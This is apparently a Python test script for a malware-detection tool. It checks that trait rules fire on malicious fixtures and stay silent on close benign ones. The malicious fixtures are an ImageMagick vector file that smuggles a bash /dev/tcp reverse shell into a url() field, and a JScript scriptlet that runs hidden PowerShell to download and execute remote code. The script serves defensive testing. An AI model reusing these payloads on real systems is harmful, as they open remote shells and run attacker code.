#!/usr/bin/env python3
"""Check malicious vector and scriptlet shapes against close benign cases."""
import json
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
vector = 'objectives/execution/exploit/command-injection::imagemagick-vector-url-shell-injection'
reverse = 'objectives/execution/exploit/command-injection::imagemagick-vector-interactive-tcp-shell'
scriptlet = 'objectives/execution/interpreter/script/wsh::scriptlet-hidden-powershell-download-eval'
cases = {
    'vector.jpg': ("push graphic-context\nfill 'url(https://example.invalid/\"|bash -i >& /dev/tcp/127.0.0.1/1234 0>&1\")'\npop graphic-context\n", {vector, reverse}),
    'image.jpg': ("push graphic-context\nfill 'url(https://example.invalid/image.png)'\npop graphic-context\n", set()),
    'loader.js': ('''<scriptlet><registration><script language="JScript"><![CDATA[\nps = "powershell.exe -exec bypass -Windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/file')";\nnew ActiveXObject("WScript.Shell").Run(ps,0,true);\n]]></script></registration></scriptlet>''', {scriptlet}),
    'visible.js': ('''<scriptlet><registration><script language="JScript"><![CDATA[\nps = "powershell.exe -Windowstyle normal Write-Output hello";\nnew ActiveXObject("WScript.Shell").Run(ps,1,true);\n]]></script></registration></scriptlet>''', set()),
}
with tempfile.TemporaryDirectory(prefix='vector-scriptlet-') as tmp:
    paths = []
    for name, (source, _) in cases.items():
        path = Path(tmp) / name
        path.write_text(source)
        paths.append(str(path))
    result = subprocess.run(
        [str((repo / '../cleave/target/release/cleave').resolve()), '--traits-dir', str(repo), '--format=json', *paths],
        check=True, capture_output=True, text=True,
    )
    seen = set()
    for line in result.stdout.splitlines():
        file = json.loads(line)['files'][0]
        name = Path(file['path']).name
        actual = {t['id'] for t in file.get('traits', [])} & {vector, reverse, scriptlet}
        assert actual == cases[name][1], (name, actual)
        seen.add(name)
    assert seen == set(cases), seen
print('Vector and scriptlet boundaries passed.')
